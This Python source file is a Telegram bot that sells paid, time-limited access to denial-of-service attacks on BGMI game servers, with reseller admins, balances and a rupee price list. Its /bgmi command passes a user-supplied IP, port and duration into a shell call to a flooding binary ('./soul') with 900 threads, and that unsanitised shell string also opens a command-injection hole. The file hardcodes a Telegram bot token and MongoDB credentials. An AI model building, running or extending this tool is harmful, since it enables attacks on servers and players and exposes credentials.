from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from datetime import datetime, timedelta
import subprocess
import time  # Import time for sleep functionalit
import asyncio
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from pymongo import MongoClient

# Bot token
BOT_TOKEN = '7718352742:AAGUjv_NDp4sgnTnFQ62BPBgcb49wdKLrjY'  # Replace with your bot token

# Admin ID
ADMIN_ID = 1944182800

# Admin information
ADMIN_USERNAME = "❄️Daku Bhaiz❄️"
ADMIN_CONTACT = "@DAKUBhaiZz"

# MongoDB Connection
MONGO_URL = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
client = MongoClient(MONGO_URL)

# Database and Collection
db = client["dake"]  # Database name
collection = db["Users"]  # Collection name

# Dictionary to track recent attacks with a cooldown period
recent_attacks = {}

# Cooldown period in seconds
COOLDOWN_PERIOD = 180

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin = collection.find_one({"user_id": update.effective_user.id})
    
    # Check if the user is the Super Admin or a normal admin
    if update.effective_user.id != ADMIN_ID and (not admin or not admin.get("is_admin", False)):
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])  # ID of the user to approve
        duration = context.args[1]  # Duration with a unit (e.g., 1m, 2h, 3d)

        # Parse the duration
        duration_value = int(duration[:-1])  # Numeric part
        duration_unit = duration[-1].lower()  # Unit part (m = minutes, h = hours, d = days)

        # Calculate expiration time
        if duration_unit == "m":  # Minutes
            expiration_date = datetime.now() + timedelta(minutes=duration_value)
        elif duration_unit == "h":  # Hours
            expiration_date = datetime.now() + timedelta(hours=duration_value)
        elif duration_unit == "d":  # Days
            expiration_date = datetime.now() + timedelta(days=duration_value)
        else:
            await update.message.reply_text(
                "❌ *Invalid duration format. Use `m` for minutes, `h` for hours, or `d` for days.*",
                parse_mode="Markdown"
            )
            return

        # Super Admin logic: No balance deduction
        if update.effective_user.id == ADMIN_ID:
            collection.update_one(
                {"user_id": user_id},
                {"$set": {"user_id": user_id, "expiration_date": expiration_date}},
                upsert=True
            )
            await update.message.reply_text(
                f"✅ *User {user_id} approved by Super Admin for {duration_value} "
                f"{'minute' if duration_unit == 'm' else 'hour' if duration_unit == 'h' else 'day'}(s).* \n"
                f"⏳ *Access expires on:* {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode="Markdown"
            )
            return

        # Balance deduction for normal admins
        pricing = {
            1: 75,  # 1 day = ₹75
            3: 195,  # 3 days = ₹195
            7: 395,  # 7 days = ₹395
            30: 715  # 30 days = ₹715
        }
        price = pricing.get(duration_value) if duration_unit == "d" else None  # Pricing only applies for days

        if price is None:
            await update.message.reply_text(
                "❌ *Normal admins can only approve for fixed durations: 1, 3, 7, 30 days.*",
                parse_mode="Markdown"
            )
            return

        admin_balance = admin.get("balance", 0)
        if admin_balance < price:
            await update.message.reply_text("❌ *Insufficient balance to approve this user.*", parse_mode="Markdown")
            return

        # Deduct balance for normal admin
        collection.update_one(
            {"user_id": update.effective_user.id},
            {"$inc": {"balance": -price}}
        )

        # Approve the user
        collection.update_one(
            {"user_id": user_id},
            {"$set": {"user_id": user_id, "expiration_date": expiration_date}},
            upsert=True
        )

        await update.message.reply_text(
            f"✅ *User {user_id} approved for {duration_value} days by Admin.*\n"
            f"💳 *₹{price} deducted from your balance.*\n"
            f"⏳ *Access expires on:* {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode="Markdown"
        )

    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /approve <user_id> <duration>*\n\n"
            "Example durations:\n\n"
            "1 Days = ₹75\n"
            "3 Days = ₹195\n"
            "7 Days = ₹395\n"
            "30 Days = ₹715\n",
            parse_mode="Markdown"
        )
        
# Remove a user from MongoDB
async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode='Markdown')
        return

    try:
        user_id = int(context.args[0])

        # Remove user from MongoDB
        result = collection.delete_one({"user_id": user_id})

        if result.deleted_count > 0:
            await update.message.reply_text(f"❌ *User {user_id} has been removed from the approved list.*", parse_mode='Markdown')
        else:
            await update.message.reply_text("🚫 *User not found in the approved list.*", parse_mode='Markdown')
    except IndexError:
        await update.message.reply_text("❌ *Usage: /remove <user_id>*", parse_mode='Markdown')

# Check if a user is approved
def is_user_approved(user_id):
    user = collection.find_one({"user_id": user_id})
    if user:
        expiration_date = user.get("expiration_date")
        if datetime.now() < expiration_date:
            return True
        else:
            # Remove expired user
            collection.delete_one({"user_id": user_id})
    return False

# Function to add spaced buttons to messages
def get_default_buttons():
    keyboard = [
        [InlineKeyboardButton("💖 JOIN OUR CHANNEL 💖", url="https://t.me/DAKUBHAIZ")],
        [InlineKeyboardButton("👻 CONTACT OWNER 👻", url="https://t.me/DAKUBhaiZz")]
    ]
    return InlineKeyboardMarkup(keyboard)
    
async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])
        balance = int(context.args[1])

        # Add admin privileges and balance
        collection.update_one(
            {"user_id": user_id},
            {"$set": {"is_admin": True, "balance": balance}},
            upsert=True
        )

        await update.message.reply_text(
            f"✅ *User {user_id} is now an admin with ₹{balance} balance.*", parse_mode="Markdown"
        )
    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /addadmin <user_id> <balance>*",
            parse_mode="Markdown"
        )
        
async def addbalance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])
        amount = int(context.args[1])

        # Add balance to the admin's account
        collection.update_one(
            {"user_id": user_id},
            {"$inc": {"balance": amount}}
        )

        await update.message.reply_text(
            f"✅ *₹{amount} added to Admin {user_id}'s balance.*", parse_mode="Markdown"
        )
    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /addbalance <user_id> <amount>*",
            parse_mode="Markdown"
        )
        
async def adminbalance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin = collection.find_one({"user_id": update.effective_user.id})
    if not admin or not admin.get("is_admin", False):
        await update.message.reply_text("🚫 *You are not an admin.*", parse_mode="Markdown")
        return

    balance = admin.get("balance", 0)
    await update.message.reply_text(f"💳 *Admin current balance is ₹{balance}.*", parse_mode="Markdown")

# Command Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    welcome_message = (
        f"👋 *Hello, {user.first_name}!*\n\n"
        "✨ *Welcome to the bot.*\n"
        "📜 *Type /help to see available commands.*\n\n"
        "💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @DAKUBhaiZz."
    )
    await update.message.reply_text(welcome_message, parse_mode='Markdown',
    reply_markup=get_default_buttons())

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_message = (
        "📜 *Here are the available commands:*\n\n"
        "🚀/bgmi - For Attack In Game\n"
        "💶/price - Check the latest prices\n"
        "📑/rule - View the rules\n"
        "👤/owner - Information about the bot owner\n"
        "💌/myinfo - View your personal information\n"
        "-----------------------------------------------------------------------\n"
        "💥 ONLY ADMIN COMMANDS\n\n"
        "/approve - Approve Karne Ke Liye\n"
        "/adminbalance - Admin Balance\n\n"
        "💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @DAKUBhaiZz."
    )
    await update.message.reply_text(help_message, parse_mode='Markdown',
    reply_markup=get_default_buttons())

# Global variables to track current attack
current_attack_user = None  # Tracks the current user attacking
current_attack_end_time = None  # Tracks when the current attack will end

# Global variable for attack time limit (default: 240 seconds)
attack_time_limit = 240

# Command to set the attack limit dynamically
async def set_attack_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        new_limit = int(context.args[0])  # New attack limit in seconds
        if new_limit < 1:
            await update.message.reply_text("⚠️ *Invalid limit. Please enter a value greater than 0.*", parse_mode="Markdown")
            return
        global attack_time_limit
        attack_time_limit = new_limit  # Update global attack time limit
        await update.message.reply_text(f"✅ *Attack time limit has been updated to {new_limit} seconds.*", parse_mode="Markdown")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ *Usage: /setattacklimit <duration_in_seconds>*", parse_mode="Markdown")

# BGMI command: Restricting the attack time limit based on `attack_time_limit` variable
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack_user, current_attack_end_time, attack_time_limit

    user_id = update.effective_user.id
    user_name = update.effective_user.first_name

    # Check if user is approved
    if not is_user_approved(user_id):
        await update.message.reply_text(
            "🚫 *You are not authorized to use this command.*\n"
            "💬 *Please contact the admin if you believe this is an error.*",
            parse_mode="Markdown",
        )
        return

    # Validate arguments (IP, Port, Duration)
    if len(context.args) != 3:
        await update.message.reply_text(
            f"✅ *Usage:* /bgmi <ip> <port> <duration>",
            parse_mode="Markdown",
        )
        return

    ip = context.args[0]
    port = context.args[1]
    try:
        time_duration = int(context.args[2])
    except ValueError:
        await update.message.reply_text(
            "⚠️ *Invalid duration. Please enter a valid number.*",
            parse_mode="Markdown",
        )
        return

    # Check if duration exceeds the attack time limit
    if time_duration > attack_time_limit:
        await update.message.reply_text(
            f"⚠️ *You cannot attack for more than {attack_time_limit} seconds.*",
            parse_mode="Markdown",
        )
        return

    # Check if another attack is in progress
    if current_attack_user is not None:
        remaining_time = (current_attack_end_time - datetime.now()).total_seconds()
        if remaining_time > 0:
            await update.message.reply_text(
                f"⚠️ *Another user (ID: {current_attack_user}) is already attacking. Please wait {int(remaining_time)} seconds.*",
                parse_mode="Markdown",
            )
            return
        else:
            # If time has passed, reset the global variables
            current_attack_user = None
            current_attack_end_time = None

    # Set current user as the attacking user
    current_attack_user = user_id
    current_attack_end_time = datetime.now() + timedelta(seconds=time_duration)

    # Send attack started message
    await update.message.reply_text(
        f"🚀 *ATTACK STARTED*\n"
        f"🌐 *IP:* {ip}\n"
        f"🎯 *PORT:* {port}\n"
        f"⏳ *DURATION:* {time_duration} seconds\n"
        f"👤 *User:* {user_name} (ID: {user_id})\n\n"
        "💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @DAKUBhaiZz.",
        parse_mode="Markdown",
    )

    # Start the attack process
    asyncio.create_task(run_attack(ip, port, time_duration, update, user_id))
    
# Default thread value
default_thread = "900"

# Command to set thread dynamically
async def set_thread(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        global default_thread
        new_thread = context.args[0]
        if not new_thread.isdigit():
            await update.message.reply_text("❌ *Invalid thread value. Please provide a numeric value.*", parse_mode="Markdown")
            return

        default_thread = new_thread  # Update the default thread value
        await update.message.reply_text(f"✅ *Thread value updated to {default_thread}.*", parse_mode="Markdown")
    except IndexError:
        await update.message.reply_text("❌ *Usage: /setthread <thread_value>*", parse_mode="Markdown")

# Modify the attack command to use the dynamic thread value
async def run_attack(ip, port, time_duration, update, user_id):
    global current_attack_user, current_attack_end_time, default_thread

    try:
        # Simulate the attack command with dynamic thread
        command = f"./soul {ip} {port} {time_duration} {default_thread}"
        process = subprocess.Popen(command, shell=True)

        # Wait for the specified duration
        await asyncio.sleep(time_duration)

        # Terminate the process after the duration
        process.terminate()

        # Send attack finished message
        await update.message.reply_text(
            f"✅ *ATTACK FINISHED*\n"
            f"🌐 *IP:* {ip}\n"
            f"🎯 *PORT:* {port}\n"
            f"⏳ *DURATION:* {time_duration} seconds\n"
            f"💻 *Thread Used:* {default_thread}\n"
            f"👤 *User ID:* {user_id}\n\n"
            "💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @DAKUBhaiZz.",
            parse_mode="Markdown",
        )

    except Exception as e:
        # Handle errors during the attack
        await update.message.reply_text(
            f"⚠️ *Error occurred during the attack:* {str(e)}",
            parse_mode="Markdown",
        )
    finally:
        # Reset global variables to allow the next attack
        if current_attack_user == user_id:
            current_attack_user = None
            current_attack_end_time = None
            
async def price(update: Update, context: ContextTypes.DEFAULT_TYPE):
    price_message = (
        "💰 *PRICE LIST:*\n\n"
        "⭐ 1 Day = ₹115\n"
        "⭐ 3 Days = ₹295\n"
        "⭐ 1 Week = ₹525\n"
        "⭐ 1 Month = ₹995\n"
        "⭐ Lifetime = ₹1,585\n\n"
        "💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @DAKUBhaiZz."
    )
    await update.message.reply_text(price_message, parse_mode='Markdown',
    reply_markup=get_default_buttons())

async def rule(update: Update, context: ContextTypes.DEFAULT_TYPE):
    rule_message = "⚠️ *Rule: Ek Time Pe Ek Hi Attack Lagana*\n\n💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @DAKUBhaiZz."
    await update.message.reply_text(rule_message, parse_mode='Markdown',
    reply_markup=get_default_buttons())

async def owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"👤 *The owner of this bot is {ADMIN_USERNAME}.*\n"
        f"✉️ *Contact:* {ADMIN_CONTACT}\n\n", parse_mode='Markdown'
    )

async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    info_message = (
        "📝 *Your Information:*\n"
        f"🔗 *Username:* @{user.username}\n"
        f"🆔 *User ID:* {user.id}\n"
        f"👤 *First Name:* {user.first_name}\n"
        f"👥 *Last Name:* {user.last_name if user.last_name else 'N/A'}\n\n"
        "💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @DAKUBhaiZz."
    )
    await update.message.reply_text(info_message, parse_mode='Markdown',
    reply_markup=get_default_buttons())

async def admincommand(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await not_authorized_message(update)
        return

    admin_message = (
        "🔧 *Admin-only commands:*\n"
        "/approve - Add user\n"
        "/remove - Remove user\n"
        "/set - Set Attack Time\n"
        "/setthread - Thread Changing\n"
        "/addbalance - Add Admin Balance\n"
        "/addadmin - Add Reseller\n"
        "💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @DAKUBhaiZz."
    )
    await update.message.reply_text(admin_message, parse_mode='Markdown')

# Main function to run the bot
def main():
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("price", price))
    application.add_handler(CommandHandler("rule", rule))
    application.add_handler(CommandHandler("owner", owner))
    application.add_handler(CommandHandler("myinfo", myinfo))
    application.add_handler(CommandHandler("admincommand", admincommand))
    application.add_handler(CommandHandler("set", set_attack_limit))
    application.add_handler(CommandHandler("setthread", set_thread))
    application.add_handler(CommandHandler("addadmin", addadmin))
    application.add_handler(CommandHandler("addbalance", addbalance))
    application.add_handler(CommandHandler("adminbalance", adminbalance))

    # Start the bot
    application.run_polling()
    print("Bot is running...")

if __name__ == '__main__':
    main()
    
